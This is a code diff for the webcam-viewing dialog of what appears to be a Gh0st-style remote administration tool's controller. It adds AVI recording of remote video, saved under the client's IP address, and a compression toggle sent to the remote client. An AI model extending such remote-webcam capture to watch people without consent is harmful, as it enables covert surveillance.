@@ -9,15 +9,110 @@
 
 enum
 {
+	IDM_ENABLECOMPRESS = 0x0010,	// 视频压缩
 	IDM_SAVEAVI,					// 保存录像
 };
 // CVideoDlg 对话框
 
 IMPLEMENT_DYNAMIC(CVideoDlg, CDialog)
 
+AVISTREAMINFO CBmpToAvi::m_si;
+
+CBmpToAvi::CBmpToAvi()
+{
+	m_pfile = NULL;
+	m_pavi = NULL;
+	AVIFileInit();
+}
+
+CBmpToAvi::~CBmpToAvi()
+{
+	AVIFileExit();
+}
+
+bool CBmpToAvi::Open( LPCTSTR szFile, LPBITMAPINFO lpbmi )
+{
+	if (szFile == NULL)
+		return false;
+	m_nFrames = 0;
+
+	if (AVIFileOpen(&m_pfile, szFile, OF_WRITE | OF_CREATE, NULL))
+		return false;
+
+	m_si.fccType = streamtypeVIDEO;
+	m_si.fccHandler = BI_RGB;
+	m_si.dwScale = 1;
+	m_si.dwRate = 8; // 帧率
+	SetRect(&m_si.rcFrame, 0, 0, lpbmi->bmiHeader.biWidth, lpbmi->bmiHeader.biHeight);
+	m_si.dwSuggestedBufferSize = lpbmi->bmiHeader.biSizeImage;
+
+	if (AVIFileCreateStream(m_pfile, &m_pavi, &m_si))
+		return false;
+
+
+	if (AVIStreamSetFormat(m_pavi, 0, lpbmi, sizeof(BITMAPINFO)) != AVIERR_OK)
+		return false;
+
+	return true;
+}
+
+bool CBmpToAvi::Write(LPVOID lpBuffer)
+{
+	if (m_pfile == NULL || m_pavi == NULL)
+		return false;
+
+	return AVIStreamWrite(m_pavi, m_nFrames++, 1, lpBuffer, m_si.dwSuggestedBufferSize, AVIIF_KEYFRAME, NULL, NULL) == AVIERR_OK;	
+}
+
+
+void CBmpToAvi::Close()
+{
+	if (m_pavi)
+	{
+		AVIStreamRelease(m_pavi);
+		m_pavi = NULL;
+	}
+	if (m_pfile)
+	{
+		AVIFileRelease(m_pfile);
+		m_pfile = NULL;
+	}		
+}
+
+
+void CVideoDlg::SaveAvi(void)
+{
+	CMenu	*pSysMenu = GetSystemMenu(FALSE);
+	if (pSysMenu->GetMenuState(IDM_SAVEAVI, MF_BYCOMMAND) & MF_CHECKED)
+	{
+		pSysMenu->CheckMenuItem(IDM_SAVEAVI, MF_UNCHECKED);
+		m_aviFile.Empty();
+		m_aviStream.Close();
+		return;
+	}
+
+	CString	strFileName = m_strIPAddress + CTime::GetCurrentTime().Format("_%Y-%m-%d_%H-%M-%S.avi");
+	CFileDialog dlg(FALSE, "avi", strFileName, OFN_OVERWRITEPROMPT, "视频文件(*.avi)|*.avi|", this);
+	if(dlg.DoModal () != IDOK)
+		return;
+	m_aviFile = dlg.GetPathName();
+	if (!m_aviStream.Open(m_aviFile, m_BitmapInfor_Full))
+	{
+		m_aviFile.Empty();
+		MessageBox("创建录像文件失败!");	
+	}
+	else
+	{
+		pSysMenu->CheckMenuItem(IDM_SAVEAVI, MF_CHECKED);
+	}
+}
+
+
 CVideoDlg::CVideoDlg(CWnd* pParent, IOCPServer* IOCPServer, CONTEXT_OBJECT *ContextObject)
 	: CDialog(CVideoDlg::IDD, pParent)
 {
+	m_nCount = 0;
+	m_aviFile.Empty();
 	m_ContextObject = ContextObject;
 	m_iocpServer = IOCPServer;
 	m_BitmapInfor_Full = NULL;
@@ -52,6 +147,12 @@ void CVideoDlg::ResetScreen(void)
 
 CVideoDlg::~CVideoDlg()
 {
+	if (!m_aviFile.IsEmpty())
+	{
+		SaveAvi();
+		m_aviFile.Empty();
+	}
+
 	if (m_pVideoCodec)
 	{
 		delete m_pVideoCodec;
@@ -103,8 +204,9 @@ BOOL CVideoDlg::OnInitDialog()
 		m_hDD = DrawDibOpen();
 
 		m_hDC = ::GetDC(m_hWnd);
-
+		SysMenu->AppendMenu(MF_STRING, IDM_ENABLECOMPRESS, "视频压缩(&C)");
 		SysMenu->AppendMenu(MF_STRING, IDM_SAVEAVI, "保存录像(&V)");
+		SysMenu->AppendMenu(MF_SEPARATOR);
 
 		CString strString;
 
@@ -123,6 +225,11 @@ BOOL CVideoDlg::OnInitDialog()
 
 void CVideoDlg::OnClose()
 {
+	if (!m_aviFile.IsEmpty())
+	{
+		SaveAvi();
+		m_aviFile.Empty();
+	}
 #if CLOSE_DELETE_DLG
 	m_ContextObject->v1 = 0;
 #endif
@@ -137,6 +244,8 @@ void CVideoDlg::OnClose()
 
 void CVideoDlg::OnReceiveComplete(void)
 {
+	++m_nCount;
+
 	switch (m_ContextObject->InDeCompressedBuffer.GetBuffer(0)[0])
 	{
 	case TOKEN_WEBCAM_DIB:
@@ -156,35 +265,31 @@ void CVideoDlg::DrawDIB(void)
 	if (SysMenu == NULL)
 		return;
 
-	int		nHeadLen = 1 + 1 + 4;       
+	const int nHeadLen = 1 + 1 + 4;       
 
 	LPBYTE	szBuffer = m_ContextObject->InDeCompressedBuffer.GetBuffer();
 	UINT	ulBufferLen = m_ContextObject->InDeCompressedBuffer.GetBufferLength();
 	if (szBuffer[1] == 0) // 没有经过H263压缩的原始数据，不需要解码
 	{
 		// 第一次，没有压缩，说明服务端不支持指定的解码器
-		/*	if (m_nCount == 1)
+		if (m_nCount == 1)
 		{
-		pSysMenu->EnableMenuItem(IDM_ENABLECOMPRESS, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
+			SysMenu->EnableMenuItem(IDM_ENABLECOMPRESS, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
 		}
-		pSysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, MF_UNCHECKED);
-		memcpy(m_lpScreenDIB, lpBuffer + nHeadLen, nBufferLen - nHeadLen);*/
+		SysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, MF_UNCHECKED);
+		memcpy(m_BitmapData_Full, szBuffer + nHeadLen, ulBufferLen - nHeadLen);
 	}
-
 	else // 解码
 	{
 		////这里缓冲区里的的第二个字符正好是是否视频解码 
-		InitCodec(*(LPDWORD)(szBuffer + 2)); //判断       
+		InitCodec(*(LPDWORD)(szBuffer + 2)); //判断
 		if (m_pVideoCodec != NULL)
 		{
-			//pSysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, MF_CHECKED);
-			memcpy(m_BitmapCompressedData_Full, szBuffer + nHeadLen, ulBufferLen - nHeadLen);   //视频没有解压
+			SysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, MF_CHECKED);
+			memcpy(m_BitmapCompressedData_Full, szBuffer + nHeadLen, ulBufferLen - nHeadLen); //视频没有解压
 			//这里开始解码，解码后就是同未压缩的一样了 显示到对话框上。 接下来开始视频保存成avi格式
 			m_pVideoCodec->DecodeVideoData(m_BitmapCompressedData_Full, ulBufferLen - nHeadLen, 
-				(LPBYTE)m_BitmapData_Full, NULL,  NULL);  //将视频数据解压到m_lpScreenDIB
-
-			/*	m_pVideoCodec->DecodeVideoData(m_lpCompressDIB, nBufferLen - nHeadLen, 
-			(LPBYTE)m_lpScreenDIB, NULL,  NULL);  //将视频数据解压到m_lpScreenDIB*/
+				(LPBYTE)m_BitmapData_Full, NULL,  NULL);  //将视频数据解压
 		}
 	}
 
@@ -198,9 +303,16 @@ void CVideoDlg::InitCodec(DWORD fccHandler)
 		return;
 
 	m_pVideoCodec = new CVideoCodec;
-	if (!m_pVideoCodec->InitCompressor(m_BitmapInfor_Full, fccHandler))     //这里忘了格式 匹配了
+	if (!m_pVideoCodec->InitCompressor(m_BitmapInfor_Full, fccHandler))
 	{
 		OutputDebugStringA("======> InitCompressor failed \n");
+		delete m_pVideoCodec;
+		// 置NULL, 发送时判断是否为NULL来判断是否压缩
+		m_pVideoCodec = NULL;
+		// 通知服务端不启用压缩
+		BYTE bToken = COMMAND_WEBCAM_DISABLECOMPRESS;
+		m_iocpServer->OnClientPreSending(m_ContextObject, &bToken, sizeof(BYTE));
+		GetSystemMenu(FALSE)->EnableMenuItem(IDM_ENABLECOMPRESS, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
 	}
 }
 
@@ -212,6 +324,19 @@ void CVideoDlg::OnSysCommand(UINT nID, LPARAM lParam)
 	{
 	case IDM_SAVEAVI:
 		{
+			SaveAvi();
+			break;
+		}
+	case IDM_ENABLECOMPRESS:
+		{
+			CMenu *pSysMenu = GetSystemMenu(FALSE);
+			bool bIsChecked = pSysMenu->GetMenuState(IDM_ENABLECOMPRESS, MF_BYCOMMAND) & MF_CHECKED;
+			pSysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, bIsChecked ? MF_UNCHECKED : MF_CHECKED);
+			bIsChecked = !bIsChecked;
+			BYTE	bToken = COMMAND_WEBCAM_ENABLECOMPRESS;
+			if (!bIsChecked)
+				bToken = COMMAND_WEBCAM_DISABLECOMPRESS;
+			m_iocpServer->OnClientPreSending(m_ContextObject, &bToken, sizeof(BYTE));
 			break;
 		}
 	}
@@ -243,4 +368,14 @@ void CVideoDlg::OnPaint()
 		m_BitmapInfor_Full->bmiHeader.biWidth, m_BitmapInfor_Full->bmiHeader.biHeight, 
 		DDF_SAME_HDC
 		);
+
+	if (!m_aviFile.IsEmpty())
+	{
+		m_aviStream.Write(m_BitmapData_Full);
+		// 提示正在录像
+		SetBkMode(m_hDC, TRANSPARENT);
+		SetTextColor(m_hDC, RGB(0xff,0x00,0x00));
+		const LPCTSTR lpTipsString = "Recording";
+		TextOut(m_hDC, 0, 0, lpTipsString, lstrlen(lpTipsString));
+	}
 }
